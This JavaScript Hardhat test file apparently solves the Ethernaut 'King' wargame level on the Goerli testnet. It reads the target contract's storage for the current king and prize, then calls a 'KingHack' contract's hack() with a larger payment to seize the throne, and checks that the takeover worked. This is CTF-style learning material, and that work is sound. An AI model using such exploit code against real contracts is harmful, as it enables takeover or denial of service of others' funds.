const { expect } = require("chai");
const { ethers } = require("hardhat");
const Web3 = require('web3');
const { api_key, private_key } = require('../secrets.json');

describe("KingHack", function () {
    
    beforeEach(async function () {
        // Se deploya el contrato
        const KingHack = await ethers.getContractFactory("KingHack");
        this.kingHack = await KingHack.deploy();
    });
    
    it("Hack", async function () {
        const contract_address = "0xE27Ca2AfAC7Cf78b52a77E904bA7226e7Ed7B99e";
        
        // obtain current prize, it's on the 1st position of the storage        
        var web3 = new Web3(`wss://eth-goerli.g.alchemy.com/v2/${api_key}`);
        let king = await web3.eth.getStorageAt(contract_address, 0);
        let prize = await web3.eth.getStorageAt(contract_address, 1);
        console.log(king);
        console.log(prize+0);
        
        // hack
        await this.kingHack.hack(contract_address, {value: prize+1, gasLimit: 4000000});
        king = await web3.eth.getStorageAt(contract_address, 0);
        expect(king).to.be.eq(this.kingHack.address);
        console.log(king);
  });

  afterEach(async function() {
    // COMPLETAR
  });

});
